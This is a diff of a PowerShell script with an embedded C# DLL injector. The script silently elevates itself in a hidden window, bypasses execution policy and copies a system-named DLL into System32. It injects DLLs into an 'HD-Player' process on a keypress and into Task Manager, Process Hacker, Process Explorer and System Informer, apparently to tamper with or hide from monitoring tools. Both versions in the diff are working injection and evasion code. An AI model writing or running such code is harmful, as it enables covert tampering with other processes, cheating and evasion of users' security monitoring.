@@ -1,9 +1,8 @@
-# Auto-elevation function: Relaunch script as admin if not elevated
+# Auto-elevation
 function Ensure-RunAsAdmin {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
-    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    if (-not $isAdmin) {
+    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = "powershell.exe"
         $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
@@ -18,10 +17,9 @@ function Ensure-RunAsAdmin {
         exit
     }
 }
-
 Ensure-RunAsAdmin
 
-# Start imgui.ini Monitor Loop as a background job
+# imgui.ini monitor
 Start-Job -ScriptBlock {
     $desktopPath = [Environment]::GetFolderPath('Desktop')
     $iniPath = Join-Path $desktopPath "imgui.ini"
@@ -36,22 +34,7 @@ Start-Job -ScriptBlock {
     }
 } | Out-Null
 
-# DLL paths and target process
-$dllFolder = "C:\Windows\SysWOW64"
-$dll1 = "Aotbst.dll"
-$dll2 = "cimgui.dll"
-$dll3 = "dwmhost.dll"
-$extraDll = "abal.dll"
-$processName = "HD-Player"
-$system32Path = "$env:windir\System32"
-$destDll3Path = Join-Path -Path $system32Path -ChildPath $dll3
-$extraDllPath = Join-Path -Path $system32Path -ChildPath $extraDll
-
-# Process Monitor List for tool injections
-$monitorProcs = @("ProcessHacker", "SystemInformer", "procexp", "Taskmgr")
-$injectedTools = @{}
-
-# C# Injector
+# DLL Injector C# Code
 $injectorCode = @"
 using System;
 using System.Text;
@@ -59,36 +42,51 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 public class Injector {
-    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint size, uint allocType, uint protect);
-    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr written);
-    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint stackSize, IntPtr startAddress, IntPtr parameter, uint flags, IntPtr threadId);
-    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buffer, uint size, out UIntPtr written);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hMod, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string modName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attrs, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr handle);
+
     public const int PROCESS_ALL = 0x1F0FFF;
     public const uint MEM_COMMIT = 0x1000;
     public const uint MEM_RESERVE = 0x2000;
     public const uint PAGE_READWRITE = 0x04;
 
     public static bool Inject(int pid, string dllPath) {
-        IntPtr hProcess = OpenProcess(PROCESS_ALL, false, pid);
-        if (hProcess == IntPtr.Zero) return false;
+        IntPtr hProc = OpenProcess(PROCESS_ALL, false, pid);
+        if (hProc == IntPtr.Zero) return false;
 
-        IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (alloc == IntPtr.Zero) return false;
+        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (addr == IntPtr.Zero) return false;
 
-        byte[] buffer = Encoding.Unicode.GetBytes(dllPath);
-        WriteProcessMemory(hProcess, alloc, buffer, (uint)buffer.Length, out var written);
+        byte[] bytes = Encoding.Unicode.GetBytes(dllPath);
+        UIntPtr written;
+        if (!WriteProcessMemory(hProc, addr, bytes, (uint)bytes.Length, out written)) return false;
 
-        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
-        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
+        IntPtr hMod = GetModuleHandle("kernel32.dll");
+        IntPtr loadLib = GetProcAddress(hMod, "LoadLibraryW");
         if (loadLib == IntPtr.Zero) return false;
 
-        IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, alloc, 0, IntPtr.Zero);
+        IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
         if (thread == IntPtr.Zero) return false;
 
-        CloseHandle(hProcess);
+        CloseHandle(hProc);
         return true;
     }
 }
@@ -102,41 +100,68 @@ public class KeyCheck {
     }
 }
 "@
-
 Add-Type -TypeDefinition $injectorCode -Language CSharp
 
-Write-Output "Monitoring for process $processName..."
+# Paths & Dlls
+$dllFolder = "C:\Windows\SysWOW64"
+$system32Path = "$env:windir\System32"
 
-# Main loop
+$dll1 = Join-Path $dllFolder "Aotbst.dll"
+$dll2 = Join-Path $dllFolder "cimgui.dll"
+$dll3 = Join-Path $dllFolder "dwmhost.dll"
+$dll3Dest = Join-Path $system32Path "dwmhost.dll"
+$extraDll = "abal.dll"
+$extraDllPath = Join-Path $system32Path $extraDll
+
+$targetProcess = "HD-Player"
+$monitoringTools = @("Taskmgr", "ProcessHacker", "procexp", "SystemInformer")
+
+# Monitor thread for abal.dll
+Start-Job -ScriptBlock {
+    while ($true) {
+        foreach ($name in $using:monitoringTools) {
+            $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
+            if ($proc) {
+                foreach ($p in $proc) {
+                    Write-Output "Detected $($p.ProcessName). Attempting to inject $using:extraDll..."
+                    $result = [Injector]::Inject($p.Id, $using:extraDllPath)
+                    if ($result) {
+                        Write-Output "Injected $using:extraDll into $($p.ProcessName) (PID: $($p.Id))"
+                    } else {
+                        Write-Error "Failed to inject $using:extraDll into $($p.ProcessName)"
+                    }
+                }
+            }
+        }
+        Start-Sleep -Seconds 2
+    }
+} | Out-Null
+
+# Main DLL injection for HD-Player
+Write-Output "Monitoring for process $targetProcess..."
 while ($true) {
-    # Inject into HD-Player
-    $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     if ($proc) {
-        Write-Output "Found $processName with PID $($proc.Id). Waiting for [Del]..."
+        Write-Output "Process $targetProcess found with PID $($proc.Id)"
+        Write-Output "Waiting for [Del] key to inject main DLLs..."
         while (-not [KeyCheck]::IsDelPressed()) {
             Start-Sleep -Milliseconds 50
         }
 
-        Write-Output "[Del] pressed. Proceeding with injection..."
         try {
-            Copy-Item -Path (Join-Path $dllFolder $dll3) -Destination $destDll3Path -Force
-            Write-Output "Copied $dll3 to $system32Path"
+            Copy-Item -Path $dll3 -Destination $dll3Dest -Force
+            Write-Output "Copied dwmhost.dll to $system32Path"
         } catch {
-            Write-Error "Failed to copy $dll3. Run as administrator."
-            exit 1
+            Write-Error "Failed to copy dwmhost.dll. Try running as Administrator."
         }
 
-        $dllPaths = @(
-            Join-Path $dllFolder $dll1,
-            Join-Path $dllFolder $dll2
-        )
-
-        foreach ($dll in $dllPaths) {
-            Write-Output "Injecting $dll into $processName..."
-            if ([Injector]::Inject($proc.Id, $dll)) {
+        foreach ($dll in @($dll1, $dll2)) {
+            Write-Output "Injecting $dll..."
+            $result = [Injector]::Inject($proc.Id, $dll)
+            if ($result) {
                 Write-Output "Successfully injected $dll"
             } else {
-                Write-Warning "Failed to inject $dll"
+                Write-Error "Failed to inject $dll"
             }
         }
 
@@ -145,35 +170,8 @@ while ($true) {
             $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
         } while ($proc)
 
-        Write-Output "$processName exited. Resuming monitoring..."
+        Write-Output "$targetProcess exited. Resuming monitoring..."
+    } else {
+        Start-Sleep -Seconds 2
     }
-
-    # Monitor tool processes and inject Actioncenter.dll
-    foreach ($toolProcName in $monitorProcs) {
-        $toolList = Get-Process -Name $toolProcName -ErrorAction SilentlyContinue
-        foreach ($toolProc in $toolList) {
-            if (-not $toolProc) { continue }
-
-            $pid = $toolProc.Id
-            if ($injectedTools[$toolProcName] -eq $pid) {
-                continue
-            }
-
-            # Try up to 3 times
-            for ($i = 1; $i -le 3; $i++) {
-                Write-Output "Injecting $extraDll into $toolProcName (PID: $pid) - Attempt $i"
-                $result = [Injector]::Inject($pid, $extraDllPath)
-                if ($result) {
-                    Write-Output "✅ Successfully injected into $toolProcName (PID: $pid)"
-                    $injectedTools[$toolProcName] = $pid
-                    break
-                } else {
-                    Write-Warning "⚠️ Failed to inject into $toolProcName (PID: $pid), retrying..."
-                    Start-Sleep -Milliseconds 300
-                }
-            }
-        }
-    }
-
-    Start-Sleep -Milliseconds 500
 }
